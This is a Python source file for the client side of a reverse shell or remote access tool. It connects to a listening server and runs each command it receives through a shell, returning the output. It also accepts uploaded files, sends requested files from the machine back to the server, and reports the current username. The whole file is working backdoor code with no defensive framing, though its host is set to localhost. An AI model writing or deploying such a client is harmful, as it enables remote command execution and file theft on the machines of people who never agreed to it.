import socket
import subprocess
import os
import getpass

HEADER = 50
HOST = '127.0.0.1'
PORT = 5764

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
s.setblocking(1)
try:
    s.connect((HOST,PORT))
    print('Sucessfully Connected to the server...')
except socket.error:
    print('Unable to connect to the server please try again.')

def read_code(cmd):
    """
    Receives commands and executes it afterwards sends it to the server.
    """
    shell = subprocess.Popen(cmd,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    shell_out,shell_err = shell.communicate()
    msg = str(shell_out.decode('windows-1252')) + str(shell_err.decode('windows-1252'))
    return msg


while True:
    loc = os.getcwd()
    cmd_header = s.recv(HEADER)
    cmd_len = int(cmd_header.decode('utf-8').strip())
    cmd = s.recv(cmd_len)
    cmd = str(cmd.decode('utf-8'))

    if cmd.lower().startswith('send'):
        try:
            size_len = s.recv(HEADER)
            size_len = int(size_len.decode('utf-8').strip())
            size = s.recv(size_len)
            size = int(size.decode('utf-8'))
            paths = cmd[5:]
            all_paths = paths.split('>')
            file_name = os.path.basename(all_paths[0].strip())
            #If destination path is not specified the file is stored in the current working directory.
            if len(all_paths) > 1:
                dest_path = all_paths[1].strip()+'\\'+file_name
            else:
                dest_path = loc+'\\'+file_name
            file = open(dest_path,'wb')
            count = 0
            while count < size :
                chunk = s.recv(1024)
                file.write(chunk)
                count += len(chunk)
            file.close()
            print("Done.")
        except Exception as e:
            print(e)
    elif cmd.lower().startswith('download'):
        try:
            req_file = cmd.replace('download ','').strip()
            data = str(os.path.getsize(req_file)).encode('utf-8')
            head = f'{len(data):<50}'.encode()
            msg = head + data
            s.send(msg)
            file = open(req_file,'rb')
            chunk = file.read(1024)
            while chunk:
                s.send(chunk)
                chunk = file.read(1024)
        except FileNotFoundError:
            print(f'Error File Not Found at current Location {os.getcwd()}')
    elif cmd.lower().startswith('cd'):
        lines = cmd.split(' ')

        if lines[1] == '..':
            loc = loc.split('\\')[:-1]
            loc = '\\'.join(loc)
            os.chdir(loc)
        else:
            try:
                os.chdir(' '.join(lines[1:]))
                loc=os.getcwd()
            except FileNotFoundError:
                pass
        msg = read_code(cmd)
        msg = msg + loc+'>'
        s.send(msg.encode('utf-8'))
    elif cmd.lower().strip() == 'name':
        name = getpass.getuser()
        s.send(str.encode(name))
    else:
        msg = read_code(cmd)
        msg = msg + loc+'>'
        s.send(msg.encode('utf-8'))

